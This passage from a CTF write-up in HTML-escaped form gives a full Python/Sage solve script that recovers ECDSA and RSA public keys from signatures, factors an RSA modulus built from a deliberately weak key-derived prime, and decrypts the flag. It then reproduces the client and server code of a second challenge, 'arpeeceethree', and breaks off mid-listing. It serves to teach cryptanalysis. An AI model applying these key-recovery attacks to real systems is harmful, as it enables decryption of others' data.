&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(MSG1_HASH&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digest())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r_inv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(r, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, E&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;order())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;R, R_ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; E&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;lift_x(K(r), all&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Q_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r_inv &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (s&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;R &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; z&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;G)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Q_2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r_inv &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (s&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;R_ &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; z&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;G)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recovering-rsa-public-key&#34;&gt;Recovering RSA Public Key&lt;/h3&gt;
&lt;p&gt;We have two messages $m_2$ and $m_3$ that are signed with RSA, yielding $s_2$ and $s_3$. Searching online again I found &lt;a href=&#34;https://crypto.stackexchange.com/questions/26188/rsa-public-key-recovery-from-signatures&#34;&gt;this&lt;/a&gt; which states you can recover public modulus $n$ by computing $\gcd{(s_2^e - m_2, s_3^e - m_3)} = kn$ where $k$ is small.&lt;/p&gt;
&lt;p&gt;This makes sense as $m_2 = s_2^e \bmod{n}$ thus $m_2 = s_2^e - k_2n$ for some integer $k_2$, therefore we can GCD $m_2 - s_2^e = -k_2n$ and $m_3 - s_3^e = -k_3n$ to obtain a multiple of $n$.&lt;/p&gt;
&lt;p&gt;As $e = 65537$, this takes a while to compute, but after doing so we recover (a multiple of) the public modulus $n$.&lt;/p&gt;
&lt;p&gt;Note that $m_2$ is actually a transformed version of the plaintext message, as it is first hashed then some pkcs1_15 scheme is used to pad the message. This made it really annoying to get the message that was actually signed, so I directly edited the library code to print the message being signed, and ran the challenge script with a test flag.&lt;/p&gt;

  &lt;img src=&#34;./img/get_real_m.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 70%&#34;  /&gt;


&lt;h3 id=&#34;getting-the-flag&#34;&gt;Getting the flag&lt;/h3&gt;
&lt;p&gt;Now that we have both the ECDSA and RSA pubkey, we can recover the flag. As mentioned before, one of the RSA primes are generated deterministically based on the ECDSA pubkey $Q$:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;generate_special_prime&lt;/span&gt;(b):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(b)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt;(isPrime(t)):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        t &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; t
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rsa_p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; generate_special_prime(long_to_bytes(ec&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pointQ&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;long_to_bytes(ec&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pointQ&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So now that we recovered the pubkey, we can simply call this function to recover a prime. Even though we have 2 possible ECDSA pubkeys, we can check which one is correct by generating the 2 possible primes and using GCD with $n$.&lt;/p&gt;
&lt;p&gt;From there, it&amp;rsquo;s just simple RSA to generate the RSA private key and decrypt the flag.&lt;/p&gt;
&lt;p&gt;Solve script:



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;328675914&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;328675914&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;code.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
import Crypto.Hash.SHA256 as sha256
import Crypto.PublicKey.RSA as rsa
import Crypto.Cipher.PKCS1_OAEP as oaep
from Crypto.Util.number import *

## Generate RSA parameters
def generate_special_prime(b):
    t = bytes_to_long(b)
    while not(isPrime(t)):
        t &amp;#43;= 1
    return t

data = {&amp;#34;ec_sig&amp;#34;: &amp;#34;8d32a95ab9b4d92f6ff307d9721451707822d2eae3e07c5c605f0d5979a2e2210b5149487c4d1bedafa96628fcc3579b4842abfa156a963d7db0c15d8da32cc9&amp;#34;, &amp;#34;rsa_sig1&amp;#34;: &amp;#34;45e225f7532b25aa283f80b5166de185cff8b46fb3c9de982083b1ed4a7621c14d0ab541e945c31c9984f958d0b23331d6c636ba8c443941afa277dd2b00c9b7884b4bc9a55047b77305cc6061d9aa9e6be99b70f2f469f6c1accba77228ef129af79bb7f196176753ed27f8308a30b298c34bfc3503dce92f77f0ed8b6d16b6&amp;#34;, &amp;#34;rsa_sig2&amp;#34;: &amp;#34;56b9bac062a9a75b2db42b480e439927265a06b0815be14814f19cd27553a8bdd2815c1814a060fa25b9713b10516b57c9e1f399415492f1ac9a8795034ade99744237a6354d32c0e7330b0b0f52d237e7967863869cf9fdc387f90349c9fbffa15aa72c48ece92bbe59760f41606bfff28af9fdde8f275bf07379f798d98d4d&amp;#34;, &amp;#34;cipher&amp;#34;: &amp;#34;65312f30ef4f34edd32c11ce885c51279bdecd16168953733f04380eb1ed183542e745d630133c4c0c5ce7580bbfb90a347c387eb2743ffaeae5cb7a82058e0fb8a85f7aa392433dc12f0b78e9e0b577909353de84913a47895109de2019a3b88b72f03e13b16f7b092e7a428c664ed174b2cb63208b7a55e9d02a2c0f268d4e&amp;#34;}

MESSAGE1 = b&amp;#39;If a new source of energy is not found, no one is going to win this war&amp;#39;
MSG1_HASH = sha256.new(MESSAGE1)

ec_sig = bytes.fromhex(data[&amp;#34;ec_sig&amp;#34;])
s1 = int(data[&amp;#34;rsa_sig1&amp;#34;], 16)
s2 = int(data[&amp;#34;rsa_sig2&amp;#34;], 16)
enc_flag = bytes.fromhex(data[&amp;#34;cipher&amp;#34;])

# p-256 curve paramters from https://neuromancer.sk/std/nist/P-256
p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff 
K = GF(p)
a = K(0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc)
b = K(0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b)
E = EllipticCurve(K, (a, b))
G = E(0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296, 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5)
E.set_order(0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 * 0x1)

# part 1: recover ECC public key
r,s = bytes_to_long(ec_sig[:32]), bytes_to_long(ec_sig[32:])
z = bytes_to_long(MSG1_HASH.digest())

r_inv = pow(r, -1, E.order())
R, R_ = E.lift_x(K(r), all=True)

Q_1 = r_inv * (s*R - z*G)
Q_2 = r_inv * (s*R_ - z*G)

print(f&amp;#34;Recovered possible ECSDA pubkeys:&amp;#34;)
print(f&amp;#34;{Q_1 = }&amp;#34;)
print(f&amp;#34;{Q_2 = }&amp;#34;)

# part 2: recover RSA public key

e = 65537
# values from editing library src and printing msg before it got signed
# MESSAGE2 = b&amp;#39;Bah weep gragnah weep nini bong&amp;#39;
# MESSAGE3 = b&amp;#39;Freedom is the right of all sentient beings&amp;#39;
m2 = 5486124068793688683255936251187209270074392635932332070112001988456197381759672947165175699536362793613284725337872111744958183862744647903224103718245670299614498700710006264535421091908069935709303403272242499531581061652193706559968553759421347924920266204277973339410586176390872847811111144114590842
m3 = 5486124068793688683255936251187209270074392635932332070112001988456197381759672947165175699536362793613284725337872111744958183862744647903224103718245670299614498700710006264535421091908069935709303403272242499531581061652193643492425095701346333448554897794580398627955585138706133687412101835882486651

print(f&amp;#34;Recovering RSA pubkey...&amp;#34;)

kn = gcd(s1^e - m2, s2^e - m3)

print(f&amp;#34;Recovered RSA pubkey multiple {kn = }&amp;#34;)

# last part: decrypting flag

rsa_p_1 = generate_special_prime(long_to_bytes(int(Q_1.x()))&amp;#43;long_to_bytes(int(Q_1.y())))
rsa_p_2 = generate_special_prime(long_to_bytes(int(Q_2.x()))&amp;#43;long_to_bytes(int(Q_2.y())))

p = None
if gcd(rsa_p_1, kn) != 1:
    p = rsa_p_1
elif gcd(rsa_p_2, kn) != 1:
    p = rsa_p_2
else:
    print(&amp;#34;Something went wrong, neither primes are correct&amp;#34;)

# k*n = k*p*q
kq = kn // p
# get largest factor of kq which should be q
q = list(dict(factor(kq)).keys())[-1]

n = p*q
d = pow(e, -1, (p-1)*(q-1))

r = rsa.construct((int(n),int(e),int(d)))
decrypter = oaep.new(r)
flag = decrypter.decrypt(enc_flag)
print(f&amp;#34;{flag = }&amp;#34;)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;

&lt;/p&gt;
&lt;p&gt;Flag: &lt;code&gt;cybears{D0nt_m4k3_pr1v4t3_publ1c_k3yz!}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;arpeeceethree---3-solves&#34;&gt;arpeeceethree - 3 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;You hand over your identity parchment to the temple monk. He scrutinises it closely, looking for any signs of malintent.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python client.py -r arpeeceethree.chal.cybears.io:2323&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;There was a lot of source and dependencies to install for this challenge, but the vulnerability is actually very simple.&lt;/p&gt;
&lt;p&gt;We are provided with 3 files, &lt;code&gt;client.py&lt;/code&gt;, &lt;code&gt;server.py&lt;/code&gt; and &lt;code&gt;server.proto&lt;/code&gt;.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;912865473&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;912865473&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;client.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import * 
from google.protobuf.internal.encoder import _VarintEncoder
from google.protobuf.internal.decoder import _DecodeVarint
import server_pb2 as spb
from google.protobuf.internal.decoder import _DecodeError
import sys 
import argparse

import Crypto.Cipher.AES as AES
import Crypto.Hash.SHA512 as SHA512
from Crypto.Protocol.KDF import HKDF
from Crypto.Util.number import long_to_bytes, bytes_to_long

from ecdsa import ECDH, NIST256p, VerifyingKey


def send_message(s, msg):
    &amp;#34;&amp;#34;&amp;#34; Send a message, prefixed with its size, to a TPC/IP socket &amp;#34;&amp;#34;&amp;#34;
    data = msg.SerializeToString()
    mh = spb.MessageHeader()
    mh.msglen = len(data)
    mh.type = msg.type
    s.send(mh.SerializeToString() &amp;#43; data)
    return 

def msg_type(msgtype):
    if msgtype == spb.MSG_LOGIN_REQUEST:
        return spb.LoginRequest()
    elif msgtype == spb.MSG_LOGIN_RESPONSE:
        return spb.LoginResponse()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE:
        return spb.LoginChallenge()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE_RESPONSE:
        return spb.LoginChallengeResponse()
    elif msgtype == spb.MSG_REGISTER_REQUEST:
        return spb.RegisterRequest()
    elif msgtype == spb.MSG_REGISTER_RESPONSE:
        return spb.RegisterResponse()
    elif msgtype == spb.MSG_MESSAGE_REQUEST:
        return spb.MessageRequest()
    elif msgtype == spb.MSG_MESSAGE_RESPONSE:
        return spb.MessageResponse()
    else:
        return None


def check_fields(msg):
    result = True
    for field in msg.DESCRIPTOR.fields_by_name.keys():
        if msg.DESCRIPTOR.fields_by_name[field].label == msg.DESCRIPTOR.fields_by_name[field].LABEL_REQUIRED:
            result &amp;amp;= msg.HasField(field)
    return result

def recv_message(s):
    &amp;#34;&amp;#34;&amp;#34; Receive a message, prefixed with its size and type, from stdin &amp;#34;&amp;#34;&amp;#34;
    # Receive the size of the message data
    # expect [MessageHeader][Message of type]
    data = b&amp;#39;&amp;#39;
    header = spb.MessageHeader()
    while True:
        data&amp;#43;= s.recv(1)
        try:
            header.ParseFromString(data)
            if check_fields(header):
                break
        except _DecodeError as e:
            pass

    # Receive the message data
    data = s.recv(header.msglen)

    # Decode the message and validate all required fields are present
    msg = msg_type(header.type)
    if msg != None:
        try:
            msg.ParseFromString(data)
            if not check_fields(msg):
                return None
            return msg
        except _DecodeError:
            return None
    else:
        return None

def create_user():
    client_ecdh = ECDH(curve=NIST256p)
    client_ecdh.generate_private_key()
    return client_ecdh

def register(s, ecdh, name=b&amp;#39;bumblebear&amp;#39;, pubkey=b&amp;#39;&amp;#39;):
    ## REGISTER
    rr = spb.RegisterRequest()
    rr.type = spb.MSG_REGISTER_REQUEST
    rr.name = name
    if pubkey == b&amp;#39;&amp;#39;:
        rr.clientPublicKey = ecdh.get_public_key().to_string(encoding=&amp;#39;compressed&amp;#39;)
    else:
        rr.clientPublicKey = pubkey

    send_message(s, rr)

    ## REGISTER RESPONSE
    reg_resp = recv_message(s)
    if reg_resp != None:
        log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(reg_resp))
    if reg_resp.status == spb.FAILURE:
        log.error(&amp;#34;failed to register&amp;#34;)
    uid = reg_resp.uid
    return uid

def login(s, uid):
    ## LOGIN
    l = spb.LoginRequest()
    l.type = spb.MSG_LOGIN_REQUEST
    l.uid = uid
    send_message(s, l)

    ## LOGIN RESPONSE
    login_resp = recv_message(s)
    if login_resp != None:
        log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(login_resp))
    
    return login_resp.sessionId, login_resp.challenge, login_resp.ephemeralServerPublicKey


def login2(s, ecdh, sessionId, challenge):
    ## SIGN CHALLENGE
    sig = ecdh.private_key.sign_deterministic(challenge)

    ## GENERATE EPHEMERAL DH SESSION KEY
    client_ephemeral_ecdh = ECDH(curve=NIST256p)
    client_ephemeral_ecdh.generate_private_key()
    client_ephemeral_public_key = client_ephemeral_ecdh.get_public_key()

    send_chal = spb.LoginChallenge()
    send_chal.type = spb.MSG_LOGIN_CHALLENGE
    send_chal.sessionId = sessionId
    send_chal.ephemeralClientPublicKey = client_ephemeral_public_key.to_string(encoding=&amp;#39;compressed&amp;#39;)

    send_chal.challengeResponse = sig
    send_message(s, send_chal)

    msg_resp = recv_message(s)
    if msg_resp != None:
        log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    return client_ephemeral_ecdh

def request_msg(s, sessionId, uid, client_ephemeral, server_ephemeral):
    ## REQUEST MESSAGE
    log.info(&amp;#34;sending message request&amp;#34;)
    msg_req = spb.MessageRequest()
    msg_req.type = spb.MSG_MESSAGE_REQUEST
    msg_req.sessionId = sessionId

    send_message(s, msg_req)

    log.info(&amp;#34;receiving message&amp;#34;)
    msg_resp = recv_message(s)
    if msg_resp != None:
        log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    ## DECRYPT MESSAGE
    server_ephemeral_public_key = VerifyingKey.from_string(server_ephemeral, NIST256p)

    client_ephemeral.load_received_public_key(server_ephemeral_public_key)
    shared_secret = client_ephemeral.generate_sharedsecret_bytes()

    token  = shared_secret
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(spb.USER)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(uid)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; sessionId
    (aes_gcm_key, nonce) = HKDF(token, 16, &amp;#39;&amp;#39;, SHA512, num_keys=2)

    a = AES.new(aes_gcm_key, AES.MODE_GCM, nonce = nonce)
    message = a.decrypt_and_verify(msg_resp.encMsg, msg_resp.encMsgTag)

    log.info(&amp;#34;message received: {}&amp;#34;.format(message))
    return message

if __name__ == &amp;#34;__main__&amp;#34;:

    parser = argparse.ArgumentParser()
    parser.add_argument(&amp;#39;-r&amp;#39;, &amp;#39;--remote&amp;#39;, help=&amp;#34;The address:port of the remote server hosting the challenge&amp;#34;, required=True)
    args = parser.parse_args()

    if args.remote != None:
        host = args.remote.split(&amp;#34;:&amp;#34;)[0]
        port = int(args.remote.split(&amp;#34;:&amp;#34;)[1])
    else:
        exit(0)

    s = remote(host, port)

    ## Create new user
    log.info(&amp;#34;Creating new user&amp;#34;)
    e = create_user()

    ## Register
    log.info(&amp;#34;Registering new user&amp;#34;)
    uid = register(s,e)

    ## Login
    log.info(&amp;#34;Logging in - part 1&amp;#34;)
    (sessionId, chal, sepk) = login(s, uid)
    log.info(&amp;#34;Logging in - part 2&amp;#34;)
    ceph = login2(s, e, sessionId, chal)

    ## Request message
    log.info(&amp;#34;Requesting message&amp;#34;)
    msg = request_msg(s, sessionId, uid, ceph, sepk)
    log.info(&amp;#34;message received: {}&amp;#34;.format(msg))


    s.close()
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;352468791&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;352468791&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;server.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
#!/usr/bin/python3

# protoc -I=. --python_out=. ./server.proto
# socat -d TCP-LISTEN:2323,reuseaddr,fork EXEC:&amp;#34;python3 server_stdio_3.py&amp;#34;

from google.protobuf.internal.encoder import _VarintEncoder
from google.protobuf.internal.decoder import _DecodeVarint
import server_pb2 as spb
from google.protobuf.internal.decoder import _DecodeError

import Crypto.Cipher.AES as AES
import Crypto.Hash.SHA512 as SHA512
from Crypto.Protocol.KDF import HKDF
from Crypto.Util.number import long_to_bytes, bytes_to_long

from ecdsa import ECDH, NIST256p, VerifyingKey
import uuid

import logging
import os
import sys

from cybears import flag

#logging.root.setLevel(logging.DEBUG)
#logging.root.setLevel(logging.INFO)
logging.root.setLevel(logging.ERROR)

logger = logging.getLogger(&amp;#34;__name__&amp;#34;)

h1 = logging.StreamHandler(sys.stderr)
h1.setLevel(logging.DEBUG)
h2 = logging.StreamHandler(sys.stderr)
h2.setLevel(logging.INFO)

logger.addHandler(h1)
logger.addHandler(h2)


def send_message(msg):
    &amp;#34;&amp;#34;&amp;#34; Send a message, prefixed with its size, to stdout &amp;#34;&amp;#34;&amp;#34;
    data = msg.SerializeToString()
    mh = spb.MessageHeader()
    mh.msglen = len(data)
    mh.type = msg.type
    sys.stdout.buffer.write(mh.SerializeToString() &amp;#43; data)
    sys.stdout.flush()
    logging.info(&amp;#34;Sent msg over stdout...&amp;#34;)
    return 

def msg_type(msgtype):
    if msgtype == spb.MSG_LOGIN_REQUEST:
        return spb.LoginRequest()
    elif msgtype == spb.MSG_LOGIN_RESPONSE:
        return spb.LoginResponse()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE:
        return spb.LoginChallenge()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE_RESPONSE:
        return spb.LoginChallengeResponse()
    elif msgtype == spb.MSG_REGISTER_REQUEST:
        return spb.RegisterRequest()
    elif msgtype == spb.MSG_REGISTER_RESPONSE:
        return spb.RegisterResponse()
    elif msgtype == spb.MSG_MESSAGE_REQUEST:
        return spb.MessageRequest()
    elif msgtype == spb.MSG_MESSAGE_RESPONSE:
        return spb.MessageResponse()
    else:
        return None   

def check_fields(msg):
    result = True
    for field in msg.DESCRIPTOR.fields_by_name.keys():
        if msg.DESCRIPTOR.fields_by_name[field].label == msg.DESCRIPTOR.fields_by_name[field].LABEL_REQUIRED:
            result &amp;amp;= msg.HasField(field)
    return result

def recv_message():
    &amp;#34;&amp;#34;&amp;#34; Receive a message, prefixed with its size and type, from stdin &amp;#34;&amp;#34;&amp;#34;
    # Receive the size of the message data
    # expect [MessageHeader][Message of type]
    data = b&amp;#39;&amp;#39;
    header = spb.MessageHeader()
    while True:
        data&amp;#43;= sys.stdin.buffer.read(1)
        try: 
            header.ParseFromString(data)
            if check_fields(header):
                break
        except _DecodeError as e: 
            pass
    logging.debug(&amp;#34;header {}&amp;#34;.format(header))

    # Receive the message data
    data = sys.stdin.buffer.read(header.msglen)
    logging.debug(&amp;#34;received [{}]&amp;#34;.format(data))

    # Decode the message and validate all required fields are present
    msg = msg_type(header.type)
    if msg != None: 
        try:
            msg.ParseFromString(data)
            if not check_fields(msg):
                return None
            logging.debug(&amp;#34;msg {}&amp;#34;.format(msg))
            return msg
        except _DecodeError:
            return None
    else:
        return None

def handle_register_request(msg):
    logging.debug(&amp;#34;Got register request&amp;#34;)
    # validate request
    # check public key is on correct curve
    try:
        v = VerifyingKey.from_string(msg.clientPublicKey, NIST256p)
    except Exception as e:
        resp = spb.RegisterResponse()
        resp.type = spb.MSG_REGISTER_RESPONSE
        resp.uid = 0xff
        resp.status = spb.FAILURE
        send_message(resp) 
        logging.info(&amp;#34;FAILURE: User failed to registered with invalid pub key: {} and error {}&amp;#34;.format(msg.clientPublicKey,e))
        return spb.FAILURE

    # parse request
    uid = register_user(USERS, msg.name, msg.clientPublicKey)

    # send response
    resp = spb.RegisterResponse()
    resp.type = spb.MSG_REGISTER_RESPONSE
    resp.uid = uid
    resp.status = spb.SUCCESS
    send_message(resp) 
    logging.info(&amp;#34;SUCCESS: User registered with uid: {}&amp;#34;.format(uid))

    return spb.SUCCESS

def handle_login_request(SESSION, msg):
    logging.debug(&amp;#34;Got Login request&amp;#34;)
    resp = spb.LoginResponse()
    resp.type = spb.MSG_LOGIN_RESPONSE

    # validate request
    if msg.uid &amp;gt; len(USERS) or msg.uid == 0: 
        logging.info(&amp;#34;ERROR: invalid uid&amp;#34;)
        resp.status = spb.FAILURE
        resp.sessionId = b&amp;#39;&amp;#39;
        resp.challenge = b&amp;#39;&amp;#39;
        resp.ephemeralServerPublicKey = b&amp;#39;&amp;#39;
        send_message(resp)
        return spb.FAILURE

    requested_user = USERS[msg.uid - 1]

    # parse request
    
    # send response
    challenge = os.urandom(32) # random 32-byte challenge to sign    
    server_ephemeral_ecdh = ECDH(curve=NIST256p)
    server_ephemeral_ecdh.generate_private_key()
    server_ephemeral_public_key = server_ephemeral_ecdh.get_public_key()
    
    sessionId = str(uuid.uuid4()).encode()

    resp.status = spb.SUCCESS
    resp.sessionId = sessionId
    resp.challenge = challenge
    resp.ephemeralServerPublicKey = server_ephemeral_public_key.to_string(encoding=&amp;#39;compressed&amp;#39;)

    SESSIONS[sessionId] = {&amp;#39;completed_challenge&amp;#39;:False, &amp;#39;challenge&amp;#39;:challenge, &amp;#39;ephemeral_ecdh&amp;#39;:server_ephemeral_ecdh, &amp;#39;uid&amp;#39;:msg.uid}
    logging.debug(&amp;#34;New session created {}&amp;#34;.format(SESSIONS[sessionId]))
    logging.info(&amp;#34;SUCCESS: User correctly requested login with uid: {}&amp;#34;.format(msg.uid))
    send_message(resp)

    return spb.SUCCESS

def verify_challenge(chal, chalResponse, public_key):

    try:
        public_key.verify(chalResponse, data=chal)
    except ecdsa.BadSignatureError:
        return False

    return True

def handle_login_challenge_request(SESSION, USERS, msg):
    logging.debug(&amp;#34;Got Login Challenge request&amp;#34;)
    resp = spb.LoginChallengeResponse()
    resp.type = spb.MSG_LOGIN_CHALLENGE_RESPONSE
        
    # validate request
        # sessionId in SESSIONS?
    if msg.sessionId not in SESSIONS:
        resp.status = spb.FAILURE
        resp.sessionId = b&amp;#39;&amp;#39;
        logging.info(&amp;#34;FAILURE: User send invalid sessionId: {}&amp;#34;.format(msg.sessionId))
        send_message(resp)
        return spb.FAILURE

    uid = SESSIONS[msg.sessionId][&amp;#39;uid&amp;#39;]
    requested_user = USERS[uid - 1]
    logging.debug(&amp;#34;requested user {}: {}&amp;#34;.format(uid,requested_user))
    clientPubKey = VerifyingKey.from_string(requested_user[&amp;#39;pubkey&amp;#39;], NIST256p) #already validated 
    clientRole = requested_user[&amp;#39;role&amp;#39;]

    sessionId = msg.sessionId
        # verify challenge
    if not verify_challenge(SESSION[sessionId][&amp;#39;challenge&amp;#39;], msg.challengeResponse, clientPubKey):
        resp.status = spb.FAILURE
        resp.sessionId = b&amp;#39;&amp;#39;
        logging.info(&amp;#34;FAILURE: User failed challenge: {}&amp;#34;.format(msg.challenge))
        send_message(resp)
        return spb.FAILURE

        # ensure ephem client key is on curve
    try:
        clientEphemPubKey = VerifyingKey.from_string(msg.ephemeralClientPublicKey, NIST256p)
    except Exception as e:
        resp.status = spb.FAILURE
        resp.sessionId = b&amp;#39;&amp;#39;
        logging.info(&amp;#34;FAILURE: Invalid client ephemeral public key: {}&amp;#34;.format(msg.ephemeralClientPublicKey))
        send_message(resp)
        return spb.FAILURE

    # action request
    server_ephemeral_ecdh = SESSIONS[sessionId][&amp;#39;ephemeral_ecdh&amp;#39;]
    server_ephemeral_ecdh.load_received_public_key(clientEphemPubKey)
    shared_secret = server_ephemeral_ecdh.generate_sharedsecret_bytes()

    token  = shared_secret 
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(clientRole) 
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(uid) 
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; sessionId

    # send response
    resp.status = spb.SUCCESS
    resp.sessionId = sessionId

    SESSIONS[sessionId][&amp;#39;completed_challenge&amp;#39;] = True
    SESSIONS[sessionId].update( {&amp;#39;client_token&amp;#39;:token} )
    logging.info(&amp;#34;SUCCESS: User correctly completed challenge with uid: {}&amp;#34;.format(uid))
    send_message(resp)

    return spb.SUCCESS

def handle_message_request(SESSIONS, msg):
    logging.debug(&amp;#34;Got message request&amp;#34;)
    resp = spb.MessageResponse()
    resp.type = spb.MSG_MESSAGE_RESPONSE
    # validate request
    if msg.sessionId not in SESSIONS:
        resp.status = spb.FAILURE
        resp.encMsg = b&amp;#39;&amp;#39;
        resp.encMsgTag = b&amp;#39;&amp;#39;
